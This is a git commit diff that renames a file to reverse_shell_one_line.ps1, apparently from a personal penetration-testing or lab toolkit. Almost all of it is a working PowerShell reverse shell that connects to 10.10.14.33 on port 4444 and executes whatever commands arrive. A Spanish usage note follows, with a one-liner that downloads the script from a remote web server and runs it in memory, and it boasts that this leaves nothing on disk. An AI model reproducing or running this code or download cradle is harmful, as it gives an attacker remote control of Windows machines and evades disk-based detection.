d9787cab84841012b4f054f3d2f12c5cc10ec594
PF <pedro.flor@gmail.com>
2020-08-04 18:09:05 -0400

    Update and rename shell.ps1 to reverse_shell_one_line.ps1

--- reverse_shell_one_line.ps1
+++ reverse_shell_one_line.ps1
@@ -1,6 +1,6 @@
 $client = New-Object System.Net.Sockets.TCPClient("10.10.14.33",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
 
-Ejecutar desde sistema remoto (Windows)
----------------------------------------
+Ejecutar desde sistema remoto (Windows). El reverse shell es ejecutado SIN tocar disco :)
+------------------------------------------------------------------------------------------
 PS1> powershell.exe -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.33:8000/shell.ps1')"
